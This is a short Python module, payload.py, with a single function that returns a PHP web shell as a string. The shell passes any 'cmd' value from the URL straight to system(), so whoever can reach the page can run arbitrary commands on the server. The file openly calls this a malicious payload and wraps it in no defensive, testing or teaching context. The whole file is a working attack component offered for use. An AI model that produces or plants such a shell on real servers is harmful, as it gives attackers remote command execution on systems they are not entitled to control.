# payload.py - Module to generate a malicious PHP payload.

def generate_payload():
    """
    Generates a malicious PHP payload that can execute system commands.

    :return: The PHP payload as a string.
    """
    payload = """
    <?php
    if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
    ?>
    """
    return payload